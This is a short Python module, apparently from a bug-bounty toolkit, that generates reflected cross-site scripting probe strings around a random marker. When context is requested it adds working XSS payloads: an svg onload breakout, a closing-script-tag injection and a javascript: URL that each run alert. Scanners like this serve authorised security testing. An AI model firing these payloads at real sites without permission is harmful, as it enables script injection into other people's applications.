from __future__ import annotations

import secrets


def new_marker() -> str:
    return f"bbtkxss{secrets.token_hex(6)}"


def payloads_for_marker(marker: str, include_context: bool = False) -> list[str]:
    payloads = [
        marker,
        f"{marker}\"'",
        f"<{marker}>",
        f"\">{marker}<",
    ]
    if not include_context:
        return payloads

    value = "'" + marker.replace("\\", "\\\\").replace("'", "\\'") + "'"
    code = f'window.__bbtk_xss_marker={value};alert({value})'
    return payloads + [
        f'\"><svg onload="{code}">',
        f"</script><script>{code}</script>",
        f"javascript:{code}",
    ]
